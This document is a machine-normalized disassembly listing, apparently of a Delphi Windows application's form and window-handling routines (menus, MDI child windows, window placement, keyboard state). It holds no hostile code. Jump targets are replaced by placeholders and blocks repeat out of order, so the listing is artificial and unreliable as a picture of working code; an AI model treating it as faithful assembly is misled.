call sub_453bb8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45be84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_454418
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45bebc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45bf57
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bf5e
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_453b18
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460d20
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43da08
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460d20
jmp r-xdata
sub_45bf84
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403418
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45bfc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cefc
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45bff0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45b7b0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43d7e0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45c048
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4461c4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45f62c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403418
sub_45c0d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4470c4
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45c16c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4470c4
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45b74c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403418
sub_45c1c4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_4475f8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45c1f0
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45b7b0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45c20c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_453b48
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_453b48
sub_45c24c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45c284
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fc0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45c2b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45c409
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c410
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45c20c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43d784
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_418d40
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_4403bc
lea eax [ ebp - 0x1c ]
call sub_406ce8
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45c20c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45c24c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4609c4
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_460a2c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_460a2c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45c284
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_418d40
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_4403bc
lea eax [ ebp - 0x1c ]
call sub_406ce8
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46095c
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45c418
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45c48c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45c4b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445628
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a4c8
lea edx [ ebp - 0x14 ]
call sub_45dc90
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a4c8
lea edx [ ebp - 0x24 ]
call sub_45dc90
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45c48c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a4c8
lea edx [ ebp - 0x24 ]
call sub_45dc90
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45c48c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45c48c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45c48c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45c570
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403418
pop esi
pop ebx
retn
sub_45c594
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403418
pop esi
pop ebx
retn
sub_45c5b8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_446508
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_4475f8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4475f8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45c654
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cbbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_460e10
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45cba1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cba8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
push ebp
push sub_45caa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45c70c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b800
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445e4
jmp r-xdata
mov eax [ rw-data ]
call sub_45deec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402a8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4470c4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45dee0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
call sub_457464
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45df1c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402a8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45deec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_440b04
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45df10
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45dee0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45aab0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45aab0
jmp r-xdata
sub_45c711
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460524
call sub_403a24
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45deec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402a8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45dee0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45df1c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402a8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45deec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cba8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_440b04
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45df10
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4402ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45dee0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45aab0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
